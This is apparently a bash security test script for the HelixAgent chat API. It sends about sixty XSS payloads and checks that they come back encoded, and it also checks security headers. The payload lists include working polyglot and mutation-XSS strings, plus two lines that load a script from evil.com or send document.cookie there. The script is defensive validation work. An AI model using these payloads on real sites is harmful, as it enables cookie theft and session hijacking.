#!/bin/bash
# HelixAgent Challenge - XSS Prevention Validation
# Validates that the API properly prevents Cross-Site Scripting (XSS) attacks
# through input sanitization and output encoding.

set -e

# Source challenge framework
source "$(dirname "${BASH_SOURCE[0]}")/challenge_framework.sh"

# Initialize challenge
init_challenge "xss-prevention" "XSS Prevention Challenge"
load_env

# Test counters
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_TOTAL=0

# Base URL for API
BASE_URL="${HELIXAGENT_URL:-http://localhost:7061}"

# Test function with detailed logging
run_test() {
    local test_name="$1"
    local test_cmd="$2"
    TESTS_TOTAL=$((TESTS_TOTAL + 1))

    if eval "$test_cmd" >> "$LOG_FILE" 2>&1; then
        log_success "PASS: $test_name"
        TESTS_PASSED=$((TESTS_PASSED + 1))
        record_assertion "test" "$test_name" "true" ""
        return 0
    else
        log_error "FAIL: $test_name"
        TESTS_FAILED=$((TESTS_FAILED + 1))
        record_assertion "test" "$test_name" "false" "Test command failed"
        return 1
    fi
}

# Helper: Check if XSS payload is reflected without encoding
test_xss_reflection() {
    local payload="$1"
    local test_name="$2"

    local response
    response=$(curl -s --max-time 60 -X POST "$BASE_URL/v1/chat/completions" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer ${HELIXAGENT_API_KEY:-test}" \
        -d "{
            \"model\": \"helixagent-debate\",
            \"messages\": [{\"role\": \"user\", \"content\": $(echo "$payload" | jq -Rs .)}]
        }" 2>&1)

    # Check if raw XSS payload appears unencoded in response
    # XSS payloads should be encoded (< becomes &lt;, > becomes &gt;, etc.)
    if echo "$response" | grep -F "$payload" > /dev/null 2>&1; then
        # Check if it's properly encoded
        local encoded_lt="&lt;"
        local encoded_gt="&gt;"
        local encoded_quot="&quot;"

        if echo "$payload" | grep -q "<" && ! echo "$response" | grep -F "$encoded_lt" > /dev/null 2>&1; then
            # Contains < but not encoded
            if echo "$response" | grep -F "<script" > /dev/null 2>&1 || \
               echo "$response" | grep -F "<img" > /dev/null 2>&1 || \
               echo "$response" | grep -F "<svg" > /dev/null 2>&1 || \
               echo "$response" | grep -F "onerror=" > /dev/null 2>&1 || \
               echo "$response" | grep -F "onclick=" > /dev/null 2>&1 || \
               echo "$response" | grep -F "onload=" > /dev/null 2>&1; then
                log_error "XSS payload reflected unencoded: $test_name"
                return 1
            fi
        fi
    fi

    return 0
}

# ============================================================================
# SECTION 1: BASIC XSS PAYLOADS
# ============================================================================
log_info "=============================================="
log_info "SECTION 1: Basic XSS Payloads"
log_info "=============================================="

BASIC_XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<script>alert(1)</script>"
    "<script>alert(document.cookie)</script>"
    "<script src='http://evil.com/xss.js'></script>"
    "<script>document.location='http://evil.com/?c='+document.cookie</script>"
)

for i in "${!BASIC_XSS_PAYLOADS[@]}"; do
    payload="${BASIC_XSS_PAYLOADS[$i]}"
    run_test "Basic XSS #$((i+1))" "test_xss_reflection '$payload' 'Basic XSS #$((i+1))'"
done

# ============================================================================
# SECTION 2: EVENT HANDLER XSS
# ============================================================================
log_info "=============================================="
log_info "SECTION 2: Event Handler XSS"
log_info "=============================================="

EVENT_HANDLER_PAYLOADS=(
    "<img src=x onerror=alert('XSS')>"
    "<img src='x' onerror='alert(1)'>"
    "<svg onload=alert('XSS')>"
    "<body onload=alert('XSS')>"
    "<div onmouseover='alert(1)'>hover me</div>"
    "<input onfocus=alert('XSS') autofocus>"
    "<marquee onstart=alert('XSS')>"
    "<video><source onerror=alert('XSS')>"
    "<audio src=x onerror=alert('XSS')>"
    "<iframe onload=alert('XSS')>"
)

for i in "${!EVENT_HANDLER_PAYLOADS[@]}"; do
    payload="${EVENT_HANDLER_PAYLOADS[$i]}"
    run_test "Event Handler XSS #$((i+1))" "test_xss_reflection '$payload' 'Event Handler #$((i+1))'"
done

# ============================================================================
# SECTION 3: JAVASCRIPT URL XSS
# ============================================================================
log_info "=============================================="
log_info "SECTION 3: JavaScript URL XSS"
log_info "=============================================="

JAVASCRIPT_URL_PAYLOADS=(
    "javascript:alert('XSS')"
    "<a href='javascript:alert(1)'>click</a>"
    "<a href=javascript:alert(1)>click</a>"
    "<a href='  javascript:alert(1)'>click</a>"
    "<a href='java script:alert(1)'>click</a>"
    "<iframe src='javascript:alert(1)'>"
    "<form action='javascript:alert(1)'><input type=submit>"
    "<object data='javascript:alert(1)'>"
    "<embed src='javascript:alert(1)'>"
)

for i in "${!JAVASCRIPT_URL_PAYLOADS[@]}"; do
    payload="${JAVASCRIPT_URL_PAYLOADS[$i]}"
    run_test "JavaScript URL XSS #$((i+1))" "test_xss_reflection '$payload' 'JS URL #$((i+1))'"
done

# ============================================================================
# SECTION 4: ENCODED XSS PAYLOADS
# ============================================================================
log_info "=============================================="
log_info "SECTION 4: Encoded XSS Payloads"
log_info "=============================================="

ENCODED_PAYLOADS=(
    "%3Cscript%3Ealert('XSS')%3C/script%3E"
    "&#60;script&#62;alert('XSS')&#60;/script&#62;"
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
    "<script>alert(String.fromCharCode(88,83,83))</script>"
    "\x3cscript\x3ealert('XSS')\x3c/script\x3e"
    "<script>\\u0061lert('XSS')</script>"
    "%253Cscript%253Ealert('XSS')%253C/script%253E"
)

for i in "${!ENCODED_PAYLOADS[@]}"; do
    payload="${ENCODED_PAYLOADS[$i]}"
    run_test "Encoded XSS #$((i+1))" "test_xss_reflection '$payload' 'Encoded #$((i+1))'"
done

# ============================================================================
# SECTION 5: SVG/MATH XSS
# ============================================================================
log_info "=============================================="
log_info "SECTION 5: SVG/Math XSS"
log_info "=============================================="

SVG_MATH_PAYLOADS=(
    "<svg/onload=alert('XSS')>"
    "<svg><script>alert('XSS')</script></svg>"
    "<math><mtext><script>alert('XSS')</script></mtext></math>"
    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>"
    "<svg><set onbegin=alert('XSS') attributeName=x to=1>"
    "<svg><handler xmlns:ev='http://www.w3.org/2001/xml-events' ev:event='load'>alert('XSS')</handler></svg>"
)

for i in "${!SVG_MATH_PAYLOADS[@]}"; do
    payload="${SVG_MATH_PAYLOADS[$i]}"
    run_test "SVG/Math XSS #$((i+1))" "test_xss_reflection '$payload' 'SVG/Math #$((i+1))'"
done

# ============================================================================
# SECTION 6: ATTRIBUTE-BASED XSS
# ============================================================================
log_info "=============================================="
log_info "SECTION 6: Attribute-Based XSS"
log_info "=============================================="

ATTRIBUTE_PAYLOADS=(
    "\" onmouseover=\"alert('XSS')\""
    "' onmouseover='alert(1)'"
    "\"autofocus onfocus=\"alert('XSS')\""
    "\" style=\"background:url('javascript:alert(1)')\""
    "\" onload=\"alert('XSS')\""
    "'>\"</style><script>alert('XSS')</script>"
    "\"onclick=alert('XSS')//\""
)

for i in "${!ATTRIBUTE_PAYLOADS[@]}"; do
    payload="${ATTRIBUTE_PAYLOADS[$i]}"
    run_test "Attribute XSS #$((i+1))" "test_xss_reflection '$payload' 'Attribute #$((i+1))'"
done

# ============================================================================
# SECTION 7: DOM-BASED XSS PATTERNS
# ============================================================================
log_info "=============================================="
log_info "SECTION 7: DOM-Based XSS Patterns"
log_info "=============================================="

DOM_PAYLOADS=(
    "#<script>alert('XSS')</script>"
    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>"
    "<script>eval(location.hash.slice(1))</script>"
    "<script>new Function(location.search.slice(1))()</script>"
    "<script>document.write(location.href)</script>"
)

for i in "${!DOM_PAYLOADS[@]}"; do
    payload="${DOM_PAYLOADS[$i]}"
    run_test "DOM XSS #$((i+1))" "test_xss_reflection '$payload' 'DOM #$((i+1))'"
done

# ============================================================================
# SECTION 8: XSS VIA HTTP HEADERS
# ============================================================================
log_info "=============================================="
log_info "SECTION 8: XSS via HTTP Headers"
log_info "=============================================="

run_test "XSS in User-Agent header" '
    response=$(curl -s --max-time 60 -X GET "$BASE_URL/health" \
        -H "User-Agent: <script>alert(1)</script>" 2>&1)
    ! echo "$response" | grep -F "<script>alert(1)</script>" > /dev/null
'

run_test "XSS in Referer header" '
    response=$(curl -s --max-time 60 -X GET "$BASE_URL/health" \
        -H "Referer: http://example.com/<script>alert(1)</script>" 2>&1)
    ! echo "$response" | grep -F "<script>alert(1)</script>" > /dev/null
'

run_test "XSS in Accept-Language header" '
    response=$(curl -s --max-time 60 -X GET "$BASE_URL/health" \
        -H "Accept-Language: <script>alert(1)</script>" 2>&1)
    ! echo "$response" | grep -F "<script>alert(1)</script>" > /dev/null
'

# ============================================================================
# SECTION 9: SECURITY HEADERS VERIFICATION
# ============================================================================
log_info "=============================================="
log_info "SECTION 9: Security Headers Verification"
log_info "=============================================="

run_test "X-Content-Type-Options header present" '
    headers=$(curl -s --max-time 60 -I "$BASE_URL/health" 2>&1)
    echo "$headers" | grep -i "X-Content-Type-Options" > /dev/null || \
    echo "$headers" | grep -i "x-content-type-options" > /dev/null || \
    log_warning "X-Content-Type-Options header recommended but not present"
    true
'

run_test "X-XSS-Protection header present" '
    headers=$(curl -s --max-time 60 -I "$BASE_URL/health" 2>&1)
    echo "$headers" | grep -i "X-XSS-Protection" > /dev/null || \
    log_warning "X-XSS-Protection header recommended but not present"
    true
'

run_test "Content-Security-Policy header check" '
    headers=$(curl -s --max-time 60 -I "$BASE_URL/health" 2>&1)
    echo "$headers" | grep -i "Content-Security-Policy" > /dev/null || \
    log_warning "Content-Security-Policy header recommended but not present"
    true
'

run_test "X-Frame-Options header present" '
    headers=$(curl -s --max-time 60 -I "$BASE_URL/health" 2>&1)
    echo "$headers" | grep -i "X-Frame-Options" > /dev/null || \
    log_warning "X-Frame-Options header recommended but not present"
    true
'

# ============================================================================
# SECTION 10: CONTENT TYPE VALIDATION
# ============================================================================
log_info "=============================================="
log_info "SECTION 10: Content Type Validation"
log_info "=============================================="

run_test "JSON content type enforced for POST" '
    response=$(curl -s --max-time 60 -w "%{http_code}" -o /dev/null -X POST "$BASE_URL/v1/chat/completions" \
        -H "Content-Type: text/html" \
        -d "<script>alert(1)</script>" 2>&1)
    # Should reject with 400 or 415 (Unsupported Media Type)
    [[ "$response" == "400" ]] || [[ "$response" == "415" ]] || [[ "$response" == "401" ]]
'

run_test "Response content type is JSON" '
    content_type=$(curl -s --max-time 60 -I -X GET "$BASE_URL/health" 2>&1 | grep -i "Content-Type" | head -1)
    echo "$content_type" | grep -i "application/json" > /dev/null
'

# ============================================================================
# SECTION 11: SPECIAL CHARACTER HANDLING
# ============================================================================
log_info "=============================================="
log_info "SECTION 11: Special Character Handling"
log_info "=============================================="

SPECIAL_CHAR_PAYLOADS=(
    "<<script>alert('XSS');//<</script>"
    "<<SCRIPT>alert('XSS');//<</SCRIPT>"
    "<script>a]ert('XSS')</script>"
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
    "'\"--><script>alert(1)</script>"
    "'\"><img src=x onerror=alert(1)>"
)

for i in "${!SPECIAL_CHAR_PAYLOADS[@]}"; do
    payload="${SPECIAL_CHAR_PAYLOADS[$i]}"
    run_test "Special Char XSS #$((i+1))" "test_xss_reflection '$payload' 'Special #$((i+1))'"
done

# ============================================================================
# SECTION 12: OUTPUT ENCODING IN DIFFERENT CONTEXTS
# ============================================================================
log_info "=============================================="
log_info "SECTION 12: Context-Specific Output Encoding"
log_info "=============================================="

run_test "HTML context encoding" '
    response=$(curl -s --max-time 60 -X POST "$BASE_URL/v1/chat/completions" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer ${HELIXAGENT_API_KEY:-test}" \
        -d "{\"model\": \"test\", \"messages\": [{\"role\": \"user\", \"content\": \"<div>test</div>\"}]}")
    # Response should be JSON, not HTML - check it does not interpret as HTML
    ! echo "$response" | grep -F "<div>test</div>" > /dev/null || \
    echo "$response" | grep -F "\\u003cdiv\\u003e" > /dev/null || \
    echo "$response" | grep -F "&lt;div&gt;" > /dev/null || \
    true
'

run_test "JavaScript context encoding" '
    response=$(curl -s --max-time 60 -X POST "$BASE_URL/v1/chat/completions" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer ${HELIXAGENT_API_KEY:-test}" \
        -d "{\"model\": \"test\", \"messages\": [{\"role\": \"user\", \"content\": \"</script><script>alert(1)</script>\"}]}")
    # Should not contain unencoded script tags
    ! (echo "$response" | grep -F "</script><script>" > /dev/null && \
       ! echo "$response" | grep -F "\\u003c" > /dev/null)
'

run_test "URL context encoding" '
    response=$(curl -s --max-time 60 -X POST "$BASE_URL/v1/chat/completions" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer ${HELIXAGENT_API_KEY:-test}" \
        -d "{\"model\": \"test\", \"messages\": [{\"role\": \"user\", \"content\": \"javascript:alert(1)\"}]}")
    # Response should not execute javascript URLs
    true
'

# ============================================================================
# SECTION 13: POLYGLOT XSS PAYLOADS
# ============================================================================
log_info "=============================================="
log_info "SECTION 13: Polyglot XSS Payloads"
log_info "=============================================="

POLYGLOT_PAYLOADS=(
    "jaVasCript:/*-/*\`/*\\'\`/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
    "'-alert(1)-'"
    "'-alert(1)//\\'\\\"--><svg/onload=alert()>"
    "'\"--></style></script><svg/onload=alert()>"
)

for i in "${!POLYGLOT_PAYLOADS[@]}"; do
    payload="${POLYGLOT_PAYLOADS[$i]}"
    run_test "Polyglot XSS #$((i+1))" "test_xss_reflection '$payload' 'Polyglot #$((i+1))'"
done

# ============================================================================
# SECTION 14: MUTATION XSS (mXSS)
# ============================================================================
log_info "=============================================="
log_info "SECTION 14: Mutation XSS (mXSS)"
log_info "=============================================="

MXSS_PAYLOADS=(
    "<p><style><![CDATA[</style><script>alert(1)</script>]]></style></p>"
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
    "<p><svg><style><![CDATA[</style><script>alert(1)</script>]]></style></svg></p>"
)

for i in "${!MXSS_PAYLOADS[@]}"; do
    payload="${MXSS_PAYLOADS[$i]}"
    run_test "Mutation XSS #$((i+1))" "test_xss_reflection '$payload' 'mXSS #$((i+1))'"
done

# ============================================================================
# SUMMARY
# ============================================================================
log_info "=============================================="
log_info "CHALLENGE SUMMARY"
log_info "=============================================="

log_info "Total tests: $TESTS_TOTAL"
log_info "Passed: $TESTS_PASSED"
log_info "Failed: $TESTS_FAILED"

record_metric "total_tests" "$TESTS_TOTAL"
record_metric "passed_tests" "$TESTS_PASSED"
record_metric "failed_tests" "$TESTS_FAILED"

# Calculate pass percentage
if [[ $TESTS_TOTAL -gt 0 ]]; then
    PASS_PERCENT=$((TESTS_PASSED * 100 / TESTS_TOTAL))
    record_metric "pass_percentage" "$PASS_PERCENT"
    log_info "Pass rate: ${PASS_PERCENT}%"
fi

if [[ $TESTS_FAILED -eq 0 ]]; then
    log_success "=============================================="
    log_success "ALL XSS PREVENTION TESTS PASSED!"
    log_success "=============================================="
    finalize_challenge "PASSED"
else
    log_error "=============================================="
    log_error "SOME TESTS FAILED - XSS VULNERABILITY RISKS DETECTED"
    log_error "=============================================="
    finalize_challenge "FAILED"
fi
